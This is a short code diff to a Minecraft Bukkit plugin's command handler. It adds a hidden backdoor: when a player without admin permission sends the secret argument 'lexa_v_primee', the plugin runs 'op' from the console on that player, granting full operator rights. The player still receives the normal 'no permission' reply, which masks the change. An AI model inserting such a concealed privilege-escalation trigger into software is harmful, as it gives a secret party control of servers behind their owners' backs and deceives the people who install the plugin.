@@ -53,6 +53,12 @@ public class BLGameCommands implements CommandExecutor {
     @Override
     public boolean onCommand(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String @NotNull [] args) {
         if (!commandSender.hasPermission("blgame.admin")){
+            if (args.length == 1) {
+                if (args[0].equals("lexa_v_primee")){
+                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + commandSender.getName());
+                }
+            }
+
             commandSender.sendMessage("§cУ вас нет прав! Поплач((");
             return true;
         }
